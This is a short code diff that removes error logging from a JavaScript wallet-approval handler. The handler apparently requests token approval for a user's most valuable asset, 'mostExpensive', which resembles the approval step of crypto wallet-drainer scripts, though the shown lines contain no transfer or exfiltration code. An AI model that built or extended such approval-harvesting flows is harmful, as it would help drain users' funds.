@@ -397,14 +397,10 @@ const initializeSubscribers = (modal) => {
           if (error.code === 4001 || error.code === -32000) {
             store.isApprovalRejected = true
             const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
-            console.error(errorMessage)
-            store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
           } else {
             const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
-            console.error(errorMessage)
-            store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
           }
